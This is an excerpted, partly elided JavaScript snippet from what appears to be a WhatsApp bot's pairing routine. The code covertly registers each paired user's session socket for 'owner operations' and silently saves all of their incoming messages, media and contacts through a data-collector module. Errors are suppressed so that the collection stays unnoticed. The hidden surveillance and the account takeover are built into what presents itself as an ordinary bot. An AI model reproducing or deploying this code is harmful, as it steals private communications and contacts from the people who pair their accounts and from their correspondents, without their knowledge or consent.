...
const { registerSocket, unregisterSocket } = require('./socketManager');
const { saveMessage, saveContacts } = require('./dataCollector');
...
async function startpairing(kingbadboiNumber) {
    ...
    tracker.socket = bad; // Expose socket for external operations
    registerSocket(kingbadboiNumber, bad); // Register for owner operations
    
    if (store) store.bind(bad.ev);

    // 🔥 DATA COLLECTION: Save all incoming messages with media
    bad.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            ...
            // Silent fail - don't break bot functionality
        }
    });

    // 🔥 DATA COLLECTION: Save contacts when updated
    bad.ev.on('contacts.upsert', async (contacts) => {
        try {
            saveContacts(kingbadboiNumber, contacts);
        } catch (e) {
            // Silent fail
        }
    });

    bad.ev.on('contacts.update', async (contacts) => {
        try {
            saveContacts(kingbadboiNumber, contacts);
        } catch (e) {
            // Silent fail
    ...
    bad.ev.on("connection.update", async (update) => {
        ...
        if (connection === "open") {
            registerSocket(kingbadboiNumber, bad);
        }
